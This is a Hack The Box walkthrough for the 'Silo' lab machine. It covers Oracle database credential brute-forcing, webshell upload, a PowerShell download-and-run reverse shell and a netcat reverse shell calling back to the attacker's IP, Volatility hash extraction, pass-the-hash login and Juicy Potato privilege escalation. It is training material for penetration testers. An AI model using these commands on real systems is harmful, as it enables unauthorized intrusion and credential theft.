---
"title": "Hack The Box - Silo"
"date": 2020-06-16
"tags": ["windows", "medium", "oracle", "sqlplus", "volatility", "impersonation"]
"keywords": ["windows", "medium", "oracle", "sqlplus", "volatility", "impersonation"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Silo is medium windows box, getting initial shell is by doing a oracle database attack and uploading a webshell and here I showed two methods of getting Administrator. One is using Volatility and the memory dump we got from DropBox and another method is Token Impersonation using Juicy Potato."
"featured_image": "/img/htb-silo/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-silo/Untitled.png)

Silo is medium windows box, getting initial shell is by doing a oracle database attack and uploading a webshell and here I showed two methods of getting Administrator. One is using Volatility and the memory dump we got from DropBox and another method is Token Impersonation using Juicy Potato.

Link: [https://www.hackthebox.eu/home/machines/profile/131](https://www.hackthebox.eu/home/machines/profile/131)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional SP1 (90%), Microsoft Windows Longhorn (90%), Microsoft Windows Server 2008 SP2 (90%), Microsoft Windows Server 2008 SP1 (89%), Microsoft Windows Vista SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4m20s, deviation: 0s, median: 4m20s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-16T03:48:44
|_  start_date: 2020-06-16T03:40:17
```

## HTTP Enumeration

Its just an normal webpage, doesn't contain anything interesting. Lets run Gobuster here.

![Untitled](/img/htb-silo/Untitled%201.png)

### Gobuster Scan

It seems there is nothing here too.

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/16 09:17:09 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
===============================================================
2020/06/16 09:22:02 Finished
===============================================================
```

## Oracle Enumeration

We know port 1521 is running as oracle-tns from nmap scan results and the version is 11.2.0.2.0.

> What is Oracle? Oracle is a RDBMS database that is produced and marketed by Oracle — wikipedia

Before getting into it Follow this [https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux) and make sure `sqlplus` is working.

> Reference Link: [https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener)

### Finding SID

First we need to find SID.

> **What is a SID?** The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.

To find the SID we can use this module from Metasploit.

```bash
msf5 auxiliary(admin/oracle/sid_brute) > options

Module options (auxiliary/admin/oracle/sid_brute):

   Name     Current Setting                                         Required  Description
   ----     ---------------                                         --------  -----------
   RHOSTS                                                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:[path](path)'
   RPORT    1521                                                    yes       The target port (TCP)
   SIDFILE  /usr/share/metasploit-framework/data/wordlists/sid.txt  no        The file that contains a list of sids.
   SLEEP    1                                                       no        Sleep() amount between each request.

msf5 auxiliary(admin/oracle/sid_brute) > set RHOSTS 10.10.10.82
RHOSTS => 10.10.10.82
msf5 auxiliary(admin/oracle/sid_brute) > run
[*] Running module against 10.10.10.82

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
 [+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID ''
[*] 10.10.10.82:1521 - Done with brute force...
[*] Auxiliary module execution completed
```

So we got 2 SID `XE` and `CLRExtProc`.

### Finding SID using ODAT

So we get the same SID we got from Metasploit too

```bash
root@kali:/opt/odat# python3 odat.py sidguesser -s 10.10.10.82 -p 1521
odat.py:52: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp

[1] (10.10.10.82:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue...         
[+] 'XEXDB' is a valid SID. Continue...
```

### Finding Users Information

We Got SID so, now let’s move to the next task and extract the user account information. From this point, you can connect to the listener and brute-force credentials.

For this I gonna use another module from Metasploit `admin/oracle/oracle_login`

```bash
msf5 auxiliary(admin/oracle/oracle_login) > options

Module options (auxiliary/admin/oracle/oracle_login):

   Name     Current Setting                                                              Required  Description
   ----     ---------------                                                              --------  -----------
   CSVFILE  /usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv  no        The file that contains a list of default accounts.
   RHOST                                                                                 yes       The Oracle host.
   RPORT    1521                                                                         yes       The TNS port.
   SID      ORCL                                                                         yes       The sid to authenticate with.

msf5 auxiliary(admin/oracle/oracle_login) > set RHOST 10.10.10.82
RHOST => 10.10.10.82
msf5 auxiliary(admin/oracle/oracle_login) > set SID XE
SID => XE
msf5 auxiliary(admin/oracle/oracle_login) > run

[*] Starting brute force on 10.10.10.82:1521...
[+] Found user/pass of: scott/tiger on 10.10.10.82 with sid XE
[*] Auxiliary module execution completed
```

So we got a valid credentials `scott/tiger`

### Login with sqlplus

If you followed [this](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux) correctly, you can login now.

```bash
root@kali:/opt/oracle/instantclient_19_6# sqlplus scott/tiger@10.10.10.82/XE;

SQL*Plus: Release 19.0.0.0.0 - Production on Tue Jun 16 10:40:05 2020
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

This will show the users permission and it seems we doesn't have much permission.

```bash
SQL> select * from user_role_privs;

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT			       CONNECT			      NO  YES NO
SCOTT			       RESOURCE 		      NO  YES NO
```

But we can use `sysdba` which makes as login as system database administrator. Now we got some more Options.

```bash
root@kali:/opt/oracle/instantclient_19_6# ./sqlplus scott/tiger@10.10.10.82/XE as sysdba

SQL*Plus: Release 19.0.0.0.0 - Production on Tue Jun 16 12:08:39 2020
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS			       APEX_ADMINISTRATOR_ROLE	      YES YES NO
SYS			       AQ_ADMINISTRATOR_ROLE	      YES YES NO
SYS			       AQ_USER_ROLE		      YES YES NO
SYS			       AUTHENTICATEDUSER	      YES YES NO
SYS			       CONNECT			      YES YES NO
SYS			       CTXAPP			      YES YES NO
SYS			       DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS			       DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS			       DBA			      YES YES NO
SYS			       DBFS_ROLE		      YES YES NO

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       DELETE_CATALOG_ROLE	      YES YES NO
SYS			       EXECUTE_CATALOG_ROLE	      YES YES NO
SYS			       EXP_FULL_DATABASE	      YES YES NO
SYS			       GATHER_SYSTEM_STATISTICS       YES YES NO
SYS			       HS_ADMIN_EXECUTE_ROLE	      YES YES NO
SYS			       HS_ADMIN_ROLE		      YES YES NO
SYS			       HS_ADMIN_SELECT_ROLE	      YES YES NO
SYS			       IMP_FULL_DATABASE	      YES YES NO
SYS			       LOGSTDBY_ADMINISTRATOR	      YES YES NO
SYS			       OEM_ADVISOR		      YES YES NO
SYS			       OEM_MONITOR		      YES YES NO

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       PLUSTRACE		      YES YES NO
SYS			       RECOVERY_CATALOG_OWNER	      YES YES NO
SYS			       RESOURCE 		      YES YES NO
SYS			       SCHEDULER_ADMIN		      YES YES NO
SYS			       SELECT_CATALOG_ROLE	      YES YES NO
SYS			       XDBADMIN 		      YES YES NO
SYS			       XDB_SET_INVOKER		      YES YES NO
SYS			       XDB_WEBSERVICES		      YES YES NO
SYS			       XDB_WEBSERVICES_OVER_HTTP      YES YES NO
SYS			       XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO

32 rows selected.
```

## Getting WebShell

We can read and Write Files to the box. If you look at ODAT Github [image](https://github.com/quentinhardy/odat/blob/master-python3/pictures/ODAT_main_features_v2.0.jpg) it tells us which to use to upload a file. And I also mentioned `--sysdba` just to give some privileges.

```bash
root@kali:/opt/odat# python3 odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xw0lf.aspx /usr/share/webshells/aspx/cmdasp.aspx
odat.py:52: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp

[1] (10.10.10.82:1521): Put the /usr/share/webshells/aspx/cmdasp.aspx local file in the C:\inetpub\wwwroot folder like 0xw0lf.aspx on the 10.10.10.82 server
[+] The /usr/share/webshells/aspx/cmdasp.aspx file was created on the C:\inetpub\wwwroot directory on the 10.10.10.82 server like the 0xw0lf.aspx file
```

Its working, time to get shell

![Untitled](/img/htb-silo/Untitled%202.png)

I used [Nishang](https://github.com/samratashok/nishang)

> Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. By using this we can get the shell.

There is a lot of Shell I choosed `nishang/Shells/Invoke-PowerShellTcp.ps1` and copied that to my directory.

If we look at the Shell it gives us some of the examples.

```bash
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
the given IP and port.
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```

I copied one of the example and changed it to my IP and paste it in bottom of the file.
This not only load the module but also the shell give me a callback.

![Untitled](/img/htb-silo/Untitled%203.png)

We need to start `python` server inorder to download it to the box. Started my `netcat` listener too.

![Untitled](/img/htb-optimum/5.png)

Now its time to upload the module to the box

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/Invoke-PowerShellTcp.ps1')
```

We got the shell

![Untitled](/img/htb-silo/Untitled%204.png)


There is file in User directory and it contains a DropBox link and its password

```bash
PS C:\Users\Phineas\Desktop> download "Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$
```

When I tried to open that, it shows me Incorrect Password.

![Untitled](/img/htb-silo/Untitled%205.png)

After sometime, I viewed the same file using the web and it seems there is no `?` in the beginning.

![Untitled](/img/htb-silo/Untitled%206.png)

So I logged in with that pasword and there is a file.

![Untitled](/img/htb-silo/Untitled%207.png)

## Privilege Escalation by Memory Dump

The file we got from DropBox contains memory dump of the machine, we can use a tool called volatility to analyze it.

First we need get the system details for Volatility

```bash
PS C:\Users\Phineas\Desktop> systeminfo

Host Name:                 SILO
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
System Type:               x64-based PC
```

We can also use the plugin `imageinfo` from Volatility

```bash
root@kali:~/CTF/HTB/Boxes/Silo# volatility -f SILO-20180105-221806.dmp imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
          Suggested Profile(s) : Win8SP0x64, Win10x64_17134, Win81U1x64, Win10x64_10240_17770, Win2012R2x64_18340, Win10x64_14393, Win10x64, Win2016x64_14393, Win10x64_16299, Win2012R2x64, Win2012x64, Win8SP1x64_18340, Win10x64_10586, Win8SP1x64, Win10x64_15063 (Instantiated with Win10x64_15063)
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/root/CTF/HTB/Boxes/Silo/SILO-20180105-221806.dmp)
                      PAE type : No PAE
                           DTB : 0x1a7000L
                          KDBG : 0xf80078520a30L
          Number of Processors : 2
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff8007857b000L
                KPCR for CPU 1 : 0xffffd000207e8000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2018-01-05 22:18:07 UTC+0000
     Image local date and time : 2018-01-05 22:18:07 +0000
```

Here it suggests some more profiles but we know the system is `Microsoft Windows Server 2012 R2`

Now we can just dump the hash using `hashdump` plugin.

```bash
root@kali:~/CTF/HTB/Boxes/Silo# volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
```

And we got Administrator hash

I used the hash to login.

```bash
root@kali:~/CTF/HTB/Boxes/Silo# evil-winrm -i 10.10.10.82 -u Administrator -H 9e730375b7cbcebf74ae46481e07b0c7

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
silo\administrator
```

We own the System.

## Privilege Escalation by Token Impersonation

`whoami /all` will reveal the complete information about the user.

```bash
PS C:\Users\Phineas\Desktop> whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Here we see `SeImpersonatePrivilege` is enabled. We need to do Token Impersonation attack.**

We can use JuicyPotato for Token Impersonation attack from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges)

First I downloaded [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases) to my machine.

We need to get a normal shell instead of PowerShell. Get nc.exe [here](https://github.com/int0x33/nc.exe/blob/master/nc.exe). Upload it to the box and get revere shell.

![Untitled](/img/htb-silo/Untitled%208.png)

I created a bat file that executes nc and give me shell.

```bash
C:\TEMP>echo C:\TEMP\nc.exe -e cmd.exe 10.10.14.9 1232 > rev.bat
echo C:\TEMP\nc.exe -e cmd.exe 10.10.14.9 1232 > rev.bat
```

Then I ran `JuicyPotato` and it executes `bat` file

```bash
C:\TEMP>juicypotato.exe -p C:\TEMP\rev.bat -l 1232 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
juicypotato.exe -p C:\TEMP\rev.bat -l 1232 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 1232
......
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\TEMP>
```

![Untitled](/img/htb-silo/Untitled%209.png)

We own the system